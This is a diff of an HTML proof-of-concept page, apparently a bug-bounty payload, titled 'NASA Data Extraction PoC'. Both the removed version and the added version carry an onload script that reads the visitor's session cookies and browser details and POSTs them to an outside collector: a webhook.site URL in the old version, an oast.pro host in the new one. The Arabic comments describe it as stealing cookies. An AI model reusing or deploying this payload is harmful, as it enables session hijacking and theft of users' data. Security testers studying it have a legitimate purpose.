@@ -1,49 +1,27 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>NASA Data Extraction PoC</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      margin-top: 20%;
-    }
-    img {
-      max-width: 100%;
-    }
-  </style>
-  <script>
-    // بمجرد تحميل الصفحة، سرقة الكوكيز وإرسالها
-    window.onload = function () {
-      const data = {
-        cookies: document.cookie,  // سرقة الكوكيز
-        userAgent: navigator.userAgent, // معلومات المتصفح
-        platform: navigator.platform, // النظام
-        language: navigator.language, // لغة المتصفح
-        url: location.href, // عنوان الصفحة
-        screen: `${screen.width}x${screen.height}`, // دقة الشاشة
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone // المنطقة الزمنية
-      };
-
-      // إرسال البيانات عبر POST إلى Webhook
-      fetch("https://webhook.site/29f5b779-2540-4657-a365-bc504ee5c1de", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify(data)
-      }).then(response => {
-        console.log("Data sent to Webhook successfully.");
-      }).catch(err => {
-        console.log("Error sending data:", err);
-      });
+<script>
+  // بمجرد تحميل الصفحة، سرقة الكوكيز وإرسالها إلى OAST
+  window.onload = function () {
+    const data = {
+      cookies: document.cookie,  // سرقة الكوكيز
+      userAgent: navigator.userAgent, // معلومات المتصفح
+      platform: navigator.platform, // النظام
+      language: navigator.language, // لغة المتصفح
+      url: location.href, // عنوان الصفحة
+      screen: `${screen.width}x${screen.height}`, // دقة الشاشة
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone // المنطقة الزمنية
     };
-  </script>
-</head>
-<body>
-  <h1>NASA Data Extraction PoC</h1>
-  <p>Thanks for visiting! Your session cookies are being sent to a remote server for analysis.</p>
-  <img src="https://example.com/hidden_image.jpg" alt="Hidden Image"/>
-</body>
-</html>
+
+    // إرسال البيانات عبر POST إلى Webhook الخاص بـ OAST
+    fetch("https://d1xgcz3z1wg0000d1bcggo6agxhyyyyyb.oast.pro", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(data)
+    }).then(response => {
+      console.log("Data sent to OAST Webhook successfully.");
+    }).catch(err => {
+      console.log("Error sending data:", err);
+    });
+  };
+</script>
